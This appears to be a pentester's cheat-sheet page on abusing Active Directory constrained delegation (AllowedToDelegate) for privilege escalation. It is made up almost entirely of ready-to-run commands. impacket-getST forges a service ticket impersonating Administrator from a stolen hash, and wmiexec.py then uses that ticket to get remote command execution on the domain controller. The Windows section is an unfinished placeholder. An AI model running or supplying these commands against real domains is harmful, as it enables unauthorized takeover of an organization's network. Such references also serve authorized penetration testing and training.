---
title: "AllowedToDelegate"
date: 2024-7-23
tags: ["AllowedToDelegate", "gMSADumper", "active driectory", "ad", "Windows", "privesc"]
---

---
### Privesc #1: Forge a Ticket

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# For example, spn: www/dc.example.com (Check Bloodhound)
sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator <DOMAIN>/<USER>
```

```bash
# Export ccache
export KRB5CCNAME=Administrator.ccache
```

```bash
# Remote
sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@dc.example.com
```

<small>*Note: impacket-wmiexec may not work*</small>

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}
TO-DO
{{< /tabcontent >}}

<br>